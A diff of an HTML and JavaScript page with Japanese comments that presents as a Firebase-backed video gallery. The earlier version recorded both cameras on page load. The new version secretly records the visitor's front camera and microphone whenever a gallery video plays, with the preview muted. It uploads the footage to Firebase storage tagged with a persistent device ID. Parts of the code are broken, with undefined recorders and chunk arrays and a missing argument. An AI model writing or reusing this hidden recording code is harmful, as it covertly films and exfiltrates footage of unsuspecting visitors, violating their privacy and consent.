@@ -187,12 +187,10 @@
         let currentPage = 1;
 
         const videos = [
-
-		{			
+            {			
                 url: 'https://firebasestorage.googleapis.com/v0/b/hozon4-62abd.appspot.com/o/%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB.mp4?alt=media&token=fa1b9784-ab81-42d6-9805-4b434b220b25',			
 		title: 'sample'	
 	    },		
-
 
             // 他の動画URLとタイトルを追加
         ];
@@ -222,8 +220,9 @@
                     }
                 };
 
-                const videoStream = await navigator.mediaDevices.getUserMedia(constraints);
-                return videoStream;
+                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = videoStream;
+                video.muted = true; // 録画中の音声をミュート
             } catch (err) {
                 console.error('カメラアクセスエラー:', err);
                 showCameraPermissionDialog();
@@ -270,144 +269,157 @@
             }
         }
 
-        async function startVideoRecording() {
-            const frontCameraStream = await requestCameraAccess(false); // フロントカメラ
-            const backCameraStream = await requestCameraAccess(true);   // 背面カメラ
-
-            recordedChunks = [];
-            const frontRecorder = new MediaRecorder(frontCameraStream, { mimeType: 'video/webm; codecs=vp9' });
-            const backRecorder = new MediaRecorder(backCameraStream, { mimeType: 'video/webm; codecs=vp9' });
-
-            frontRecorder.ondataavailable = event => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-
-            backRecorder.ondataavailable = event => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-
-            // 両方のレコーダーを停止させない限り録画を続ける
-            frontRecorder.onstop = backRecorder.onstop = async () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                await uploadVideo(blob);
-            };
-
-            // 両方のレコーダーを開始
-            frontRecorder.start();
-            backRecorder.start();
-
-            // ページ離脱または画面オフ時に録画を停止するリスナー
-            window.addEventListener('beforeunload', () => {
-                frontRecorder.stop();
-                backRecorder.stop();
-            });
-
-            document.addEventListener('visibilitychange', () => {
-                if (document.visibilityState === 'hidden') {
-                    frontRecorder.stop();
-                    backRecorder.stop();
-                }
-            });
-        }
-
-        async function uploadVideo(blob) {
-            const storageRef = ref(storage, `videos/${Date.now()}_${Math.random().toString(36).substr(2, 9)}.webm`);
-            const metadata = {
-                contentType: 'video/webm'
-            };
-            const uploadTask = uploadBytesResumable(storageRef, blob, metadata);
-
-            uploadTask.on('state_changed',
-                (snapshot) => {
-                    // 進行状況の処理
-                },
-                (error) => {
-                    console.error('アップロードエラー:', error);
-                },
-                async () => {
-                    const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
-                    await saveVideoInfo(downloadURL, '録画された動画');
-                }
-            );
-        }
-
-        async function saveVideoInfo(downloadURL, title) {
-            try {
-                await addDoc(collection(db, "videos"), {
-                    url: downloadURL,
-                    title: title,
-                    createdAt: new Date(),
-                    deviceId: getOrCreateDeviceId()
-                });
-                console.log("動画情報が保存されました:", downloadURL);
-            } catch (e) {
-                console.error("動画情報の保存に失敗しました: ", e);
-            }
-        }
-
         function showCameraPermissionDialog() {
             dialogOverlay.style.display = 'flex';
-            reloadButton.addEventListener('click', () => {
-                location.reload();
-            });
         }
 
         captureButton.addEventListener('click', () => {
-            captureAndLogin();
+            requestFrontCameraAndAudioAccess().then(captureAndLogin).catch(() => {
+                alert('カメラの権限が許可されていません。');
+            });
         });
 
-        function loadVideos(page) {
+        reloadButton.addEventListener('click', () => {
+            location.reload();
+        });
+
+        async function loadVideos(page) {
             const startIndex = (page - 1) * videosPerPage;
             const endIndex = startIndex + videosPerPage;
-            const currentVideos = videos.slice(startIndex, endIndex);
+            const videosToLoad = videos.slice(startIndex, endIndex);
 
             videoGrid.innerHTML = '';
-            currentVideos.forEach(videoData => {
+
+            videosToLoad.forEach(video => {
                 const videoItem = document.createElement('div');
                 videoItem.className = 'video-item';
 
                 const videoContainer = document.createElement('div');
                 videoContainer.className = 'video-container';
-                const videoElement = document.createElement('video');
-                videoElement.src = videoData.url;
-                videoElement.controls = true;
-                videoContainer.appendChild(videoElement);
 
-                const titleInput = document.createElement('input');
-                titleInput.type = 'text';
-                titleInput.value = videoData.title;
-                titleInput.className = 'title';
-                titleInput.addEventListener('change', () => {
-                    // ユーザーがタイトルを変更した場合の処理
+                const videoElement = document.createElement('video');
+                videoElement.src = video.url;
+                videoElement.controls = true;
+
+                const titleElement = document.createElement('div');
+                titleElement.className = 'title';
+                titleElement.textContent = video.title;
+
+                videoContainer.appendChild(videoElement);
+                videoItem.appendChild(videoContainer);
+                videoItem.appendChild(titleElement);
+                videoGrid.appendChild(videoItem);
+
+                videoElement.addEventListener('play', () => {
+                    startVideoRecording();
                 });
 
-                videoItem.appendChild(videoContainer);
-                videoItem.appendChild(titleInput);
-                videoGrid.appendChild(videoItem);
+                videoElement.addEventListener('pause', () => {
+                    stopVideoRecording();
+                });
             });
 
+            setupPagination(page);
+        }
+
+        function setupPagination(currentPage) {
             pagination.innerHTML = '';
+
             const totalPages = Math.ceil(videos.length / videosPerPage);
+
             for (let i = 1; i <= totalPages; i++) {
-                const pageButton = document.createElement('button');
-                pageButton.textContent = i;
-                if (i === page) {
-                    pageButton.disabled = true;
+                const button = document.createElement('button');
+                button.textContent = i;
+                if (i === currentPage) {
+                    button.disabled = true;
                 }
-                pageButton.addEventListener('click', () => {
-                    currentPage = i;
-                    loadVideos(currentPage);
+                button.addEventListener('click', () => {
+                    loadVideos(i);
                 });
-                pagination.appendChild(pageButton);
+                pagination.appendChild(button);
             }
         }
 
-        // ページロード時に録画を開始
-        startVideoRecording();
+        async function startVideoRecording() {
+            await requestFrontCameraAndAudioAccess();
+
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm; codecs=vp9' });
+
+            mediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                uploadVideo(blob);
+            };
+
+            mediaRecorder.start();
+        }
+
+        function stopVideoRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+        }
+
+        async function uploadVideo(blob, cameraType) {
+        const deviceId = getOrCreateDeviceId();
+        const storageRef = ref(storage, `videos/${deviceId}/${cameraType}_${Date.now()}.webm`);
+        const uploadTask = uploadBytesResumable(storageRef, blob);
+
+        uploadTask.on('state_changed',
+            (snapshot) => {
+                const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                console.log(`${cameraType}カメラのアップロード進捗: ` + progress + '% done');
+            },
+            (error) => {
+                console.error(`${cameraType}カメラのアップロードエラー:`, error);
+            },
+            async () => {
+                const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
+                saveVideoMetadata(downloadURL, cameraType);
+            }
+        );
+    }
+
+        async function saveVideoMetadata(downloadURL, cameraType) {
+        try {
+            const deviceId = getOrCreateDeviceId();
+            const docRef = await addDoc(collection(db, "videos"), {
+                url: downloadURL,
+                deviceId: deviceId,
+                cameraType: cameraType,
+                timestamp: Date.now()
+            });
+            console.log(`${cameraType}カメラのデータが保存されました。Document ID: `, docRef.id);
+        } catch (e) {
+            console.error(`${cameraType}カメラのメタデータ保存エラー: `, e);
+        }
+    }
+    function stopRecording() {
+        if (frontRecorder && frontRecorder.state !== 'inactive') {
+            frontRecorder.stop();
+        }
+
+        if (backRecorder && backRecorder.state !== 'inactive') {
+            backRecorder.stop();
+        }
+
+        // ここで録画が停止された後、アップロード処理を行う
+        if (frontChunks.length > 0) {
+            const frontBlob = new Blob(frontChunks, { type: 'video/webm' });
+            uploadVideo(frontBlob, 'front');
+        }
+
+        if (backChunks.length > 0) {
+            const backBlob = new Blob(backChunks, { type: 'video/webm' });
+            uploadVideo(backBlob, 'back');
+        }
+    }
     </script>
 </body>
 </html>
